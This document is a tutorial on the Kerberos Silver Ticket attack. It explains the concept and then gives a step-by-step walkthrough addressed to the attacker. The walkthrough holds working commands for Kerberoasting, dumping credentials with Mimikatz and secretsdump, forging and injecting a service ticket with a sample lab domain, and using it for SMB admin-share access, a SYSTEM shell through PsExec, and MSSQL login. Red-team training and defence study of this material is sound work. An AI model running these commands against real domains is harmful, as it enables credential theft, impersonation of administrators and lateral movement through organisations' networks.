## **Silver Ticket Attack

### **What is a Silver Ticket Attack?**

A **Silver Ticket Attack** is a Kerberos-based attack where an attacker **forges a Ticket Granting Service (TGS) ticket** to access a specific service without interacting with the **Domain Controller (DC)**.

Unlike a **Golden Ticket Attack**, which compromises the **KRBTGT** account and grants full domain access, a **Silver Ticket Attack** exploits the **NTLM hash of a service account** (like CIFS, HTTP, MSSQL, etc.) to create forged service tickets.

## How silver ticket attacks work

To execute a silver ticket attack, an attacker must already have local administrator access on a compromised machine and obtain the [NTLM](https://www.crowdstrike.com/en-us/cybersecurity-101/identity-protection/windows-ntlm/) hash of the targeted service account. The attack follows these steps:

1. **Gather information**: The attacker collects domain details such as the Domain Security Identifier (SID) and the DNS name of the target service.
2. **Obtain the NTLM hash**: The attacker extracts the NTLM hash of a service account, often from a misconfigured service running with high privileges. This can be achieved through credential dumping techniques using tools like Mimikatz.
3. **Forge a service ticket (TGS)**: The attacker creates and encrypts a fake service ticket using the stolen service account hash, allowing authentication to the target service.
4. **Use the forged ticket**: The attacker presents the forged TGS to the service, gaining access without ever needing a Ticket Granting Ticket (TGT) from the domain controller (DC).
5. **Escalate privileges & move laterally**: Attackers can use silver ticket access to execute code as the service account, escalate privileges on the local system, or pivot to further compromise the environment.

## **Requirements for a Silver Ticket Attack**

To successfully perform a **Silver Ticket Attack**, an attacker needs:

1. **Domain Name**
2. **Target Machine Name (Service Principal Name - SPN)**
3. **Service Account NTLM Hash** (Extracted via **Kerberoasting** or **LSA Secrets Dump**)
4. **Service Name** (e.g., CIFS for file sharing, HTTP for web services, MSSQL for databases)
5. **Mimikatz or Impacket Toolkit** to forge and inject the Silver Ticket

---

## **Step-by-Step Walkthrough of a Silver Ticket Attack**

### **Step 1: Obtain NTLM Hash of a Service Account**

- **Method 1: Kerberoasting** (if Kerberos pre-auth is disabled)
    
    ```bash
    GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD>
    ```
    
    - Crack the extracted TGS ticket using **John the Ripper** or **Hashcat**.
- **Method 2: Dump LSA Secrets from the Compromised Machine**  
    If you have **local admin privileges**, extract NTLM hashes:
    
    ```powershell
    mimikatz.exe
    sekurlsa::logonpasswords
    ```
    
    OR
    
    ```powershell
    secretsdump.py <DOMAIN>/<USER>@<DC_IP> -hashes :<NTLM_HASH>
    ```
    

---

### **Step 2: Generate a Silver Ticket using Mimikatz**

Once you have the NTLM hash of the service account, forge a **TGS ticket**:

```powershell
mimikatz.exe
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_MACHINE> /service:<SERVICE_NAME> /rc4:<NTLM_HASH> /user:<FAKE_USERNAME> /ptt
```

- `DOMAIN`: Target Active Directory domain.
- `SID`: Security Identifier of the domain.
- `TARGET_MACHINE`: The hostname of the target service.
- `SERVICE_NAME`: The Kerberos service (e.g., CIFS, HTTP, MSSQL).
- `NTLM_HASH`: The NTLM hash of the service account.
- `FAKE_USERNAME`: Any arbitrary username.

✔ **Example for CIFS (SMB File Sharing) Silver Ticket**

```powershell
kerberos::golden /domain:lab.local /sid:S-1-5-21-1234567890 /target:fileserver.lab.local /service:CIFS /rc4:5f68b3b9d62e25c3751db1a42f7b26b7 /user:Administrator /ptt
```

✅ **Success**: This injects the Silver Ticket into the current session.

---

### **Step 3: Access the Target Service**

- If the ticket is successfully injected, access SMB:
    
    ```powershell
    net use \\TARGET_MACHINE\C$
    ```
    
    OR
    
    - Use `PsExec` to get SYSTEM shell:
        
        ```powershell
        PsExec.exe \\TARGET_MACHINE -s cmd.exe
        ```
        
    
    OR
    - Access MSSQL server:
        
        ```powershell
        mssqlclient.py -windows-auth <FAKE_USERNAME>@<TARGET_MACHINE>
        ```


https://juggernaut-sec.com/domain-persistence-golden-ticket-and-silver-ticket-attacks/